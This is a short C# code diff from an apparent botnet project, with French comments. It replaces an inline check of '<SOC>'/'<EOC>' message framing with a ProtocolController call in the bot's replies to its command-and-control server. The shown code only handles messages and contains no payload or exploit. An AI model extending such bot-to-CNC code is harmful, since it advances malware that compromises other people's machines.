@@ -48,16 +48,8 @@ namespace Botnet
                         string response = "";
                         byte[] buffers = new byte[1024];
 
-                        if (DataIntegrity(data) == true)
-                        {
-                            //Réponse au CNC:
-                            response = "<SOC>OK<EOC>";
-                        }
-                        else
-                        {
-                            //Réponse au CNC:
-                            response = "<SOC>Received a misformed message: {" + data +"}<EOC>";
-                        }
+                        response = new ProtocolController(data).response;
+                        
                         //Encodage de la réponse:
                         buffers = UTF8Encoding.UTF8.GetBytes(response);
                         //Envoi de la réponse:
@@ -81,22 +73,5 @@ namespace Botnet
 
         }
 
-        public bool DataIntegrity(string data)
-        {
-            int i = data.Length;
-
-            //Si la donnée ne commence pas par <SFC>
-            if (data.Substring(0,5) != "<SOC>")
-            {
-                return false;
-            }
-
-            //Si la donnée ne termine pas par <EFC>
-            if (data.Substring(data.Length - 5) != "<EOC>")
-            {
-                return false;
-            }
-            return true;
-        }
     }
 }
